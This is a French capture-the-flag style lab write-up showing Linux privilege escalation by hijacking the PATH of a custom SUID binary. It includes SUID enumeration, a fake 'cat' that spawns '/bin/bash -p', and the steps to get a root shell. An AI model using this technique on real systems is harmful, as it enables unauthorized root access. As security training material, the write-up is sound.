# Privilege Escalation - SUID Path Hijacking

## Objectif

Élever ses privilèges depuis l'utilisateur `jedha` vers `root` pour lire le flag dans `/root/flag.txt`.

## Informations de connexion

- **IP** : 10.10.3.31
- **Username** : jedha
- **Password** : jedha

## Reconnaissance

### 1. Recherche des binaires SUID

```bash
find / -perm -u=s -type f 2>/dev/null
```

Résultat intéressant : `/usr/bin/exercice` - un binaire SUID personnalisé.

### 2. Analyse du binaire avec strings

```bash
strings /usr/bin/exercice
```

Observation clé dans la sortie :
```
cat /proc/net/arp
```

Le binaire appelle `cat` **sans chemin absolu** (pas `/bin/cat`).

## Exploitation - PATH Hijacking

### Vulnérabilité

Quand un programme exécute une commande sans chemin absolu, le système utilise la variable `PATH` pour trouver l'exécutable. Si on peut modifier le `PATH` et créer notre propre version de `cat`, le binaire SUID exécutera notre code avec les privilèges root.

### Étapes d'exploitation

#### 1. Créer un faux `cat` dans /tmp

```bash
echo '/bin/bash -p' > /tmp/cat
chmod +x /tmp/cat
```

> **Note** : Le `-p` est crucial - il préserve les privilèges effectifs (EUID) du binaire SUID.

#### 2. Modifier le PATH

```bash
export PATH=/tmp:$PATH
```

#### 3. Exécuter le binaire SUID

```bash
/usr/bin/exercice
```

On obtient un shell root !

#### 4. Récupérer le flag

```bash
/bin/cat /root/flag.txt
```

> **Attention** : Utiliser `/bin/cat` (chemin absolu) car notre faux `cat` est toujours dans le PATH.

## Flag

```
jedha{REDACTED}
```
